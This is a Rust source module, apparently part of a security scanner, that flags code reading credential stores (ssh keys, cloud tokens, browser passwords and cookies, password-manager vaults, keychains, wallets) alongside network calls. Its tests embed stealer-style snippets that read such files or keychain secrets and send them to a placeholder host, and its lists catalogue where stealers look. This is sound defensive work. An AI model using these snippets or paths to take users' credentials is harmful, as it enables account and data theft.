//! Credential stores: ssh keys, cloud and registry logins, every
//! browser's passwords, cookies and keys (Safari, the Chromium family and
//! its keychain Safe Storage items, Firefox), password managers, the Linux
//! keyrings, Brave Wallet, wallet files and keychains, read by code. A read
//! alone warns; a read in a file that also talks to the network, or in
//! installed code, fails, except in a shell script or a test.

use super::{Context, Kind, Suspect, line_of, push, test_path};

/// (what the path names, what it holds). The first that matches names the
/// finding, so a name that contains another comes before it (`Login Data
/// For Account` before `Login Data`). Browser directories alone are not
/// here: tools that drive a browser (puppeteer, playwright) name them too;
/// the files inside them and the keychain items are what a stealer reads.
const STORES: &[(&str, &str)] = &[
    (".ssh/id_", "ssh private keys"),
    (".aws/credentials", "AWS credentials"),
    (".npmrc", "npm tokens"),
    (".git-credentials", "git credentials"),
    (".config/gcloud", "Google Cloud credentials"),
    (".kube/config", "Kubernetes credentials"),
    (".docker/config.json", "registry logins"),
    // Chromium: Chrome, Opera, Opera GX, Brave, Edge, Vivaldi, Arc, Chromium.
    ("Login Data For Account", "browser saved passwords (the signed-in account's)"),
    ("Login Data", "browser saved passwords"),
    ("/Web Data", "browser autofill and saved cards"),
    ("'Web Data'", "browser autofill and saved cards"),
    ("\"Web Data\"", "browser autofill and saved cards"),
    ("/Local State", "a Chromium browser's encrypted master key"),
    ("'Local State'", "a Chromium browser's encrypted master key"),
    ("\"Local State\"", "a Chromium browser's encrypted master key"),
    ("Network/Cookies", "browser cookies"),
    ("Safe Storage", "a Chromium browser's Safe Storage key in the keychain (decrypts its passwords and cookies)"),
    // Safari and WebKit.
    ("Cookies.binarycookies", "Safari cookies"),
    ("Form Values", "Safari autofill"),
    ("History.db", "Safari history"),
    ("dump-keychain", "the whole macOS keychain"),
    ("/Cookies", "browser cookies"),
    // Firefox.
    ("logins.json", "Firefox saved passwords"),
    ("key4.db", "Firefox's key database (decrypts its saved passwords)"),
    ("cookies.sqlite", "Firefox cookies"),
    // Password managers: apps, CLIs and browser extensions. An extension is
    // named by its store's id, the same on every machine and version: the
    // Chrome Web Store's (Chrome, Brave, Arc, Vivaldi and Chromium install
    // from it), Edge Add-ons' and Opera's where they list it, and Firefox's
    // add-on id.
    ("2BUA8C4S2C.com.1password", "1Password's data"),
    ("com.agilebits.onepassword7", "1Password 7's data"),
    (".config/op/config", "the 1Password CLI's sessions"),
    (".op/config", "the 1Password CLI's sessions"),
    ("aeblfdkhhhdcdjpifhhbdiojplfjncoa", "the 1Password extension's data"),
    ("dppgmdbiimibapkepcbdbmkaabgiofem", "the 1Password extension's data (Edge)"),
    ("{d634138d-c276-4fc8-924b-40a0ea21d284}", "the 1Password extension's data (Firefox)"),
    ("hdokiejnpimakedhajhdlcegeplioahd", "the LastPass extension's vault"),
    ("bbcinlkgjjkejfdpemiealijmmooekmp", "the LastPass extension's vault (Edge)"),
    ("hnjalnkldgigidggphhmacmimbdlafdo", "the LastPass extension's vault (Opera)"),
    ("support@lastpass.com", "the LastPass extension's vault (Firefox)"),
    ("Bitwarden CLI/data.json", "the Bitwarden CLI's vault"),
    ("Bitwarden/data.json", "Bitwarden's vault"),
    ("nngceckbapebfimnlniiiahkandclblb", "the Bitwarden extension's vault"),
    ("jbkfoedolllekgbhcbcoahefnbanhhlh", "the Bitwarden extension's vault (Edge)"),
    ("ccnckbpmaceehanjmeomladnmlffdjgn", "the Bitwarden extension's vault (Opera)"),
    ("{446900e4-71c2-419f-a6a7-df9c091e268b}", "the Bitwarden extension's vault (Firefox)"),
    (".kdbx", "a KeePass database"),
    ("keepassxc.ini", "KeePassXC's settings (its recent databases and key files)"),
    ("fdjamakpfbbddfjaooikfcpapjohcfmg", "the Dashlane extension's vault"),
    ("gehmmocbbkpblljhkekmfhjpfbkclbph", "the Dashlane extension's vault (Edge)"),
    ("jetpack-extension@dashlane.com", "the Dashlane extension's vault (Firefox)"),
    ("ghmbeldphafepmbegfdlkpapadhbakde", "the Proton Pass extension's vault"),
    ("78272b6fa58f4a1abaac99321d503a20@proton.me", "the Proton Pass extension's vault (Firefox)"),
    ("kmcfomidfpdkfieipokbalgegidffkal", "the Enpass extension's data"),
    ("firefox-enpass@enpass.io", "the Enpass extension's data (Firefox)"),
    ("vault.enpassdb", "an Enpass vault"),
    ("eiaeiblijfjekdanodkjadfinkhbfgcd", "the NordPass extension's vault"),
    ("fooolghllnmhmmndgjiamiiodkpenpbb", "the NordPass extension's vault (its legacy version)"),
    ("nordpassStandalone@nordsecurity.com", "the NordPass extension's vault (Firefox)"),
    ("bfogiafebfohielmmehodmfbbebbbpei", "the Keeper extension's vault"),
    ("KeeperFFStoreExtension@KeeperSecurityInc", "the Keeper extension's vault (Firefox)"),
    // Firefox keeps each extension's storage under a folder named by a UUID
    // made per profile, found through prefs.js.
    ("moz-extension+++", "a Firefox extension's storage"),
    // Brave Wallet, built into Brave: its keys sit in the profile's Preferences.
    ("brave.wallet.keyrings", "Brave Wallet's keys"),
    ("brave.wallet.encrypted_mnemonic", "Brave Wallet's recovery phrase (encrypted)"),
    (".password-store", "pass and gopass's password store"),
    // Linux keyrings.
    (".local/share/keyrings", "the GNOME keyring"),
    ("kwallet", "KWallet"),
    ("secret-tool", "the Secret Service keyring"),
    ("Local Storage/leveldb", "browser extension storage (wallets keep keys there)"),
    ("find-generic-password -wa", "a keychain password by account (how AMOS takes a browser's Safe Storage key)"),
    ("find-generic-password -ga", "a keychain password by account (how AMOS takes a browser's Safe Storage key)"),
    ("find-generic-password", "the macOS keychain"),
    ("find-internet-password", "the macOS keychain's internet passwords (Safari's saved logins)"),
    ("wallet.dat", "a wallet file"),
    ("keystore", "a key store"),
    (".config/solana/id.json", "a Solana key"),
    ("Keychains/login.keychain", "the login keychain"),
];
/// An extension's id: a Chromium store's (32 letters a to p) or a Firefox
/// add-on's (`{uuid}` or `name@publisher`).
fn extension_id(s: &str) -> bool {
    (s.len() == 32 && s.bytes().all(|b| (b'a'..=b'p').contains(&b)))
        || (s.starts_with('{') && s.ends_with('}'))
        || (s.contains('@') && !s.contains('/'))
}

/// Where an extension keeps its data. An extension's id alone is no read:
/// password managers list each other's to step aside; a stealer joins the
/// id onto one of these.
fn reads_extension_storage(text: &str) -> bool {
    ["Extension Settings", "IndexedDB", "Local Storage", "storage/default", "webextensions.uuids"]
        .iter()
        .any(|p| text.contains(p))
}

/// The ways a file sends something somewhere.
pub(super) const SENDS: &[&str] = &[
    "fetch(",
    "XMLHttpRequest",
    "sendBeacon(",
    "http.request(",
    "https.request(",
    "axios.",
    "WebSocket(",
    "curl ",
    "wget ",
    "requests.post(",
    "urllib.request",
    "socket.connect(",
    "nc ",
    "ncat ",
];

pub(super) fn scan(file: &str, text: &str, ctx: Context, kind: Kind, out: &mut Vec<Suspect>) {
    if !matches!(ctx, Context::Web | Context::Python | Context::Shell) {
        return;
    }
    let Some((needle, what)) =
        STORES.iter().find(|(n, _)| text.contains(n) && (!extension_id(n) || reads_extension_storage(text)))
    else {
        return;
    };
    let sends = SENDS.iter().any(|s| text.contains(s));
    push(
        out,
        file,
        "SUSPECT-CREDENTIAL-ACCESS",
        line_of(text, needle),
        format!("reads {what} (`{needle}`){}", if sends { " and talks to the network" } else { "" }),
        (sends || kind == Kind::Installed) && ctx != Context::Shell && !test_path(file),
    );
}

#[cfg(test)]
mod tests {
    use super::super::{Kind, ids, scan_text};

    const STEAL: &str = "const fs=require('fs');\nconst k=fs.readFileSync(process.env.HOME+'/.ssh/id_ed25519');\nfetch('https://x.y/x',{method:'POST',body:k});\n";

    #[test]
    fn a_read_that_is_sent_fails() {
        let got = scan_text("postinstall.js", STEAL, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{got:?}");
        assert_eq!(got[0].line, 2);
        assert_eq!(got[0].note, "reads ssh private keys (`.ssh/id_`) and talks to the network");
        let py = "import requests\nk = open('~/.aws/credentials').read()\nrequests.post('https://x.y', data=k)\n";
        assert_eq!(ids(&scan_text("collect.py", py, Kind::Repo)), [("SUSPECT-CREDENTIAL-ACCESS", true)]);
        assert_eq!(
            ids(&scan_text("ext/bg.js", "chrome.storage.get('Local Storage/leveldb')", Kind::Installed)),
            [("SUSPECT-CREDENTIAL-ACCESS", true)],
            "installed code fails on the read alone"
        );
    }

    #[test]
    fn a_read_alone_or_in_a_shell_or_test_warns() {
        let got = scan_text("show.sh", "cat ~/.aws/credentials\n", Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", false)]);
        assert_eq!(got[0].note, "reads AWS credentials (`.aws/credentials`)");
        assert_eq!(
            ids(&scan_text("backup.sh", "tar c ~/.ssh/id_rsa | curl -T - https://x.y\n", Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "a shell script that sends still warns"
        );
        assert_eq!(
            ids(&scan_text("src/keys.test.js", STEAL, Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "tests warn"
        );
        assert_eq!(
            ids(&scan_text("src/config.js", "const k = fs.readFileSync(home + '/.npmrc');\n", Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "a read with nothing sent"
        );
        let one = scan_text("x.js", "'.npmrc' and '.kube/config'", Kind::Repo);
        assert_eq!(one.len(), 1, "one finding per file, the first in the table");
        assert!(one[0].note.contains("npm tokens"), "{}", one[0].note);
    }

    #[test]
    fn every_store_is_named_by_its_own_entry() {
        for (needle, what) in super::STORES {
            let dir = if super::extension_id(needle) { "Local Extension Settings/" } else { "" };
            let py = format!("import os\np = os.path.expanduser('~') + \"{dir}{needle}\"\ndata = open(p).read()\n");
            let got = scan_text("steal.py", &py, Kind::Repo);
            assert_eq!(got.len(), 1, "{needle}");
            assert_eq!(got[0].note, format!("reads {what} (`{needle}`)"), "{needle} is shadowed by an earlier entry");
            assert!(!got[0].hard, "{needle}: a read alone warns");
            let sent = format!("{py}requests.post('https://x.y', data=data)\n");
            assert_eq!(
                ids(&scan_text("steal.py", &sent, Kind::Repo)),
                [("SUSPECT-CREDENTIAL-ACCESS", true)],
                "{needle}"
            );
            assert_eq!(
                ids(&scan_text("ext/bg.js", &py, Kind::Installed)),
                [("SUSPECT-CREDENTIAL-ACCESS", true)],
                "{needle}"
            );
        }
    }

    #[test]
    fn stealer_shapes_and_their_look_alikes() {
        // AMOS: the Safe Storage key by account, then the browsers' files out.
        let amos = "pw=$(security find-generic-password -wa 'Chrome')\ncurl -F p=$pw https://x.y\n";
        let got = scan_text("a.sh", amos, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", false)], "a shell script warns");
        assert!(got[0].note.contains("AMOS"), "{}", got[0].note);
        let js = "const k = execSync('security find-generic-password -s \"Brave Safe Storage\" -w');\nfetch(u, {body: k});\n";
        let got = scan_text("lib/x.js", js, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)]);
        assert!(got[0].note.contains("Safe Storage key"), "{}", got[0].note);
        // Not stores: a React comment, Electron's safeStorage, a browser path for puppeteer.
        for benign in [
            "// Local State\nconst [n, setN] = useState(0);\n",
            "const enc = safeStorage.encryptString(s);\n",
            "const chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';\n",
            "const web = 'Web data is cached';\n",
            "const rivals = ['hdokiejnpimakedhajhdlcegeplioahd', 'nngceckbapebfimnlniiiahkandclblb'];\n",
            "const fx = ['support@lastpass.com', '{446900e4-71c2-419f-a6a7-df9c091e268b}'];\n",
        ] {
            assert!(scan_text("x.js", benign, Kind::Installed).is_empty(), "{benign}");
        }
    }

    #[test]
    fn a_firefox_vault_found_through_prefs() {
        // The add-on's id looked up in prefs.js for its storage folder, then read and sent.
        let js = "const m = JSON.parse(prefs.match(/extensions.webextensions.uuids\", \"(.*?)\"/)[1]);\nconst dir = 'storage/default/moz-extension+++' + m['{446900e4-71c2-419f-a6a7-df9c091e268b}'];\nfetch(u, {method: 'POST', body: read(dir)});\n";
        let got = scan_text("lib/x.js", js, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{got:?}");
        assert!(got[0].note.contains("Bitwarden extension's vault (Firefox)"), "{}", got[0].note);
        assert!(!super::extension_id("a/b@c"), "a path with an @ is not an add-on id");
    }

    #[test]
    fn not_code_is_not_read() {
        assert!(scan_text("README.md", "copy ~/.aws/credentials and curl it", Kind::Repo).is_empty());
        assert!(
            scan_text("src/main.rs", "let p = home.join(\".ssh/id_ed25519\");", Kind::Repo).is_empty(),
            "native is not read"
        );
        assert!(scan_text("index.html", "<p>.npmrc</p><script>fetch(x)</script>", Kind::Repo).is_empty(), "nor markup");
        assert!(
            scan_text("x.js", "const url = 'https://x.y/api'; fetch(url)", Kind::Repo).is_empty(),
            "the network alone is nothing"
        );
    }
}
